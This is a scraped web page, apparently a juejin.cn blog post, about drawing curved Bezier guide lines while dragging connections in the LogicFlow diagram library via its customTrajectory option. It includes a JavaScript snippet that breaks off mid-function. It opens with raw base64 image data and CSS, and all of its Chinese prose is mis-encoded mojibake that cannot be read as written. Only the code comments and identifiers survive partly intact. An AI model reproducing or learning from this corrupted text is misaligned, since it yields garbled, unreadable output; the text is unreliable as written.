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");background-size:100%;position:relative;right:2px;top:-5px}.markdown-body input[type=checkbox]:checked:before{background:url("data:image/png;base64,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");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">å†™åœ¨å¼€å¤´</h2>
<p>Hello everyone! ğŸ¤ </p>
<p>åœ¨<a href="https://juejin.cn/post/7589107312112648201" target="_blank" title="https://juejin.cn/post/7589107312112648201">LogicFlow äº¤äº’æ–°ä½“éªŒï¼šè®©é”šç‚¹"æ´»"èµ·æ¥ï¼Œé¼ æ ‡è·ŸéšåŠ¨æ•ˆå®æˆ˜ï¼ğŸ§²</a>ä¸­ï¼Œå’±ä»¬è§£å†³äº†é”šç‚¹çš„å¸é™„äº¤äº’é—®é¢˜ã€‚ä»Šå¤©å°ç¼–è¦åˆ†äº«çš„æ˜¯å¦ä¸€é¡¹ç»†èŠ‚ä¼˜åŒ–â€”â€”<strong>è¿çº¿è½¨è¿¹ï¼ˆTrajectoryï¼‰</strong>ã€‚</p>
<p>å¤§å®¶åœ¨ä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fsite.logic-flow.cn%2F" target="_blank" title="https://site.logic-flow.cn/" ref="nofollow noopener noreferrer">LogicFlow</a> æ—¶ï¼Œé»˜è®¤çš„æ‹–æ‹½è¿çº¿ï¼Œæ— è®ºä½ æœ€ç»ˆç”Ÿæˆçš„è¾¹æ˜¯æŠ˜çº¿è¿˜æ˜¯æ›²çº¿ï¼Œ<strong>åœ¨é¼ æ ‡æ‹–æ‹½çš„è¿‡ç¨‹ä¸­ï¼Œè·Ÿéšé¼ æ ‡çš„é‚£æ¡çº¿å§‹ç»ˆæ˜¯ä¸€æ¡ç¬”ç›´çš„è™šçº¿ã€‚</strong></p>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/da27f5885fc04a83ac3118969d99cdbe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qmZ5p-Q5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767670586&amp;x-signature=Wmm9kjjm6zq0dpr7oU2wWU11mCE%3D" alt="123002.gif" loading="lazy"/></p>
<p>å¯¹äºä¸€ä¸ªè¿½æ±‚æè‡´ä½“éªŒçš„é¡¹ç›®æ¥è¯´ï¼Œè¿™å¤šå°‘æœ‰ç‚¹ "å‡ºæˆ"ã€‚ğŸ¤”</p>
<p>åœ¨å°ç¼–çš„é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬æœ€ç»ˆç”Ÿæˆçš„<strong>è¾¹</strong>æ˜¯<strong>è´å¡å°”æ›²çº¿</strong>ï¼Œæ ¹æ®è®¾è®¡äººå‘˜çš„è¦æ±‚ï¼Œè¿çº¿è¿‡ç¨‹ä¸­ä¹ŸæœŸæœ›æ˜¯ä»¥æ›²çº¿çš„å½¢å¼ï¼Œä»¥æ­¤åŒ¹é…é¡¹ç›®çš„æ•´ä½“è®¾è®¡è§„èŒƒã€‚</p>
<p>äºæ˜¯ï¼Œå°ç¼–åœ¨ç¿»é˜… <a href="https://link.juejin.cn?target=https%3A%2F%2Fsite.logic-flow.cn%2Fapi%2Fdetail%2Fconstructor" target="_blank" title="https://site.logic-flow.cn/api/detail/constructor" ref="nofollow noopener noreferrer">LogicFlow</a> æ–‡æ¡£æ—¶ï¼Œæ‰¾äº†ä¸€ä¸ª <code>customTrajectory</code> å±æ€§ï¼Œå®ƒèƒ½è®©å’±ä»¬è¿›è¡Œ<strong>è‡ªå®šä¹‰è¿çº¿è½¨è¿¹</strong>ã€‚âœ¨</p>
<blockquote>
<p>éå¸¸çµæ´»æ–¹ä¾¿ï¼Œåœ¨å°ç¼–æ—©æœŸæŠ€æœ¯é€‰å‹æ—¶ï¼Œä¹Ÿæ˜¯çœ‹ä¸­äº† LogicFlow åº“è¶…å¼ºçš„è‡ªå®šä¹‰èƒ½åŠ›ã€‚</p>
</blockquote>
<p>ä¼˜åŒ–åçš„æœ€ç»ˆæ•ˆæœå¦‚ä¸‹ï¼Œè¯·è¯¸å›æŒ‰éœ€é£Ÿç”¨å“ˆã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9c609f4565e400e9a49b990ca56dd30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qmZ5p-Q5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767670586&amp;x-signature=lee8t6EpORIfSLtG6hCZ%2BGnSwOo%3D" alt="123001.gif" loading="lazy"/></p>
<h2 data-id="heading-1">éœ€æ±‚èƒŒæ™¯</h2>
<p>åœ¨å°ç¼–é¡¹ç›®ä¸­ï¼ŒèŠ‚ç‚¹ä¹‹é—´çš„è¾¹é‡‡ç”¨çš„æ˜¯<strong>ä¸‰æ¬¡è´å¡å°”æ›²çº¿</strong>ï¼ˆ<code>bezierCurveEdge</code>ï¼‰ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯¹è¾¹è¿›è¡Œè‡ªå®šä¹‰å¼€å‘ã€‚</p>
<p>ä½†æ˜¯ï¼Œç›®å‰çš„ç—›ç‚¹æ˜¯ï¼š</p>
<ul>
<li><strong>è§†è§‰å‰²è£‚</strong>ï¼šæ‹–æ‹½æ—¶æ˜¯ç›´çº¿ï¼Œæ¾æ‰‹åå˜æ›²çº¿ï¼Œè§†è§‰ä½“éªŒä¸è¿ç»­ã€‚</li>
<li><strong>é£æ ¼ä¸ç¬¦</strong>ï¼šç”Ÿç¡¬çš„ç›´çº¿æ— æ³•ä½“ç°é¡¹ç›®æ•´ä½“â€œåœ†æ¶¦ã€æµç•…â€çš„è®¾è®¡è¯­è¨€ã€‚</li>
</ul>
<p>è®¾è®¡äººå‘˜æƒ³è¦çš„æ•ˆæœæ˜¯ï¼š</p>
<ul>
<li>ç”¨æˆ·æ‹–æ‹½è¿çº¿æ—¶ï¼Œè·Ÿéšé¼ æ ‡çš„å¼•å¯¼çº¿ç›´æ¥å±•ç¤ºä¸º<strong>æ›²çº¿</strong>ã€‚</li>
<li>å¼•å¯¼çº¿çš„æ›²ç‡åŠ¨æ€è®¡ç®—ï¼Œä¸æœ€ç»ˆç”Ÿæˆçš„è¾¹ä¿æŒä¸€è‡´ã€‚</li>
</ul>
<h2 data-id="heading-2">å…·ä½“å®ç°</h2>
<p>LogicFlow æä¾›äº†ä¸€ä¸ªéå¸¸å¼ºå¤§çš„é…ç½®é¡¹ <a href="https://link.juejin.cn?target=https%3A%2F%2Fsite.logic-flow.cn%2Fapi%2Fdetail%2Fconstructor" target="_blank" title="https://site.logic-flow.cn/api/detail/constructor" ref="nofollow noopener noreferrer">customTrajectory</a>ï¼Œå…è®¸æˆ‘ä»¬è‡ªå®šä¹‰è¿çº¿è¿‡ç¨‹ä¸­å¼•å¯¼çº¿çš„æ¸²æŸ“é€»è¾‘ã€‚</p>
<h3 data-id="heading-3">ç¬¬1ï¸âƒ£æ­¥ï¼šç†è§£customTrajectoryå±æ€§</h3>
<p>ä»æ–‡æ¡£ä¸Šçœ‹ <code>customTrajectory</code> å±æ€§æ¥æ”¶çš„æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæ‰’å…¶ç›¸å…³çš„æºç ã€‚â°</p>
<p>æºç ä½ç½®åœ¨ï¼š <code>packages/core/src/view/Anchor.tsx</code></p>
<p>æ ¸å¿ƒé€»è¾‘å¦‚ä¸‹ï¼š</p>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a6a4c65ce8264f5eaf846ddd86b3524e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qmZ5p-Q5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767670586&amp;x-signature=mzbKvDX5qskNRxInW%2FF991vRN2M%3D" alt="image.png" width="50%" loading="lazy"/>
<p>ä»æºç ä¸­å¯ä»¥æ¸…æ™°åœ°çœ‹åˆ°ï¼Œ<code>customTrajectory</code> æ˜¯ä¸€ä¸ªä¼˜å…ˆçº§æ›´é«˜çš„æ¸²æŸ“å‡½æ•°ã€‚å®ƒæ¥æ”¶èµ·ç‚¹ (<code>sourcePoint</code>)ã€ç»ˆç‚¹ (<code>targetPoint</code>) ä»¥åŠæ ·å¼é…ç½® (<code>edgeStyle</code>)ï¼Œè¦æ±‚è¿”å›ä¸€ä¸ª VDOM èŠ‚ç‚¹ï¼ˆå®ƒåœ¨ <code>render</code> å‡½æ•°ä¸­ï¼Œé€šå¸¸æ˜¯ SVG å…ƒç´ ï¼‰ã€‚</p>
<p>LogicFlow å†…éƒ¨ä½¿ç”¨ Preact/React çš„ VDOM æœºåˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¼•å…¥å…¶çš„ <code>h</code> å‡½æ•°æ¥åˆ›å»ºå…ƒç´ ã€‚</p>
<h3 data-id="heading-4">ç¬¬2ï¸âƒ£æ­¥ï¼šç¼–å†™è´å¡å°”è½¨è¿¹ç®—æ³•</h3>
<p>æ ¸å¿ƒéš¾ç‚¹åœ¨äºè®¡ç®—è´å¡å°”æ›²çº¿çš„<strong>æ§åˆ¶ç‚¹</strong>ã€‚ä¸ºäº†è®©æ›²çº¿çœ‹èµ·æ¥è‡ªç„¶ï¼Œé€šå¸¸æ§åˆ¶ç‚¹ä¼šæ ¹æ®èµ·ç‚¹å’Œç»ˆç‚¹çš„ç›¸å¯¹ä½ç½®è¿›è¡Œåç§»ã€‚</p>
<p>å’±ä»¬æ–°å»ºæ–‡ä»¶ <code>customTrajectory.js</code>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { h } <span class="hljs-keyword">from</span> <span class="hljs-string">"@logicflow/core"</span>;

<span class="hljs-comment">// å®šä¹‰ä¸€äº›å¸¸é‡ï¼Œä¿æŒä¸æœ€ç»ˆè¾¹çš„æ ·å¼ä¸€è‡´</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">STROKE_COLOR</span> = <span class="hljs-string">"#2961F7"</span>; <span class="hljs-comment">// å¼•å¯¼çº¿é¢œè‰²</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">STROKE_WIDTH</span> = <span class="hljs-number">1</span>;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@name</span> è‡ªå®šä¹‰è¿çº¿è½¨è¿¹
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">object</span>} params è½¨è¿¹å‚æ•°å¯¹è±¡
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">{x:number,y:number</span>}} params.sourcePoint èµ·ç‚¹åæ ‡
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">{x:number,y:number</span>}} params.targetPoint ç»ˆç‚¹åæ ‡ï¼ˆå³é¼ æ ‡å½“å‰ä½ç½®ï¼‰
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">*</span>} Preact è™šæ‹ŸèŠ‚ç‚¹
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">customTrajectory</span>(<span class="hljs-params">{ sourcePoint, targetPoint, ...edgeStyle }</span>) {
  <span class="hljs-keyword">const</span> { <span class="hljs-attr">x</span>: startX, <span class="hljs-attr">y</span>: startY } = sourcePoint;
  <span class="hljs-keyword">const</span> { <span class="hljs-attr">x</span>: endX, <span class="hljs-attr">y</span>: endY } = targetPoint;
  
  <span class="hljs-comment">// 1. è®¡ç®—æ°´å¹³å’Œå‚ç›´æ–¹å‘çš„è·ç¦»</span>
  <span class="hljs-keyword">const</span> dx = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(endX - startX);
  <span class="hljs-keyword">const</span> dy = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(endY - startY);
  
  <span class="hljs-comment">// 2. è®¡ç®—æ§åˆ¶ç‚¹åç§»é‡</span>
  <span class="hljs-comment">// è¿™é‡Œé‡‡ç”¨â€œä»¥æ°´å¹³æ–¹å‘ä¸ºä¸»â€çš„ç­–ç•¥ï¼Œç³»æ•° 0.6 æ˜¯ç»éªŒå€¼ï¼Œå¯ä»¥è®©æ›²çº¿å¼¯å¾—æ›´å¥½çœ‹</span>
  <span class="hljs-keyword">const</span> controlOffset = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(dx, dy) * <span class="hljs-number">0.6</span>;
  
